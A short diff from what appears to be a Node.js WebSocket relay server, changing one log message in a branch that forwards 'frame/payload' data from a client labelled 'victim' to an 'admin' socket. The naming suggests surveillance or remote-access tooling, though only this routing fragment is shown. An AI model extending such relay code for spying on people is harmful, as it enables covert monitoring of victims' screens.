@@ -43,7 +43,7 @@ wss.on('connection', (ws, req) => {
         } else if (role === 'victim') {
             if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                 adminSocket.send(message);
-                console.log('-> Successfully forwarded screen frame/payload to Admin.');
+                console.log('-> Successfully forwarded frame/payload to Admin.');
             } else {
                 console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
             }
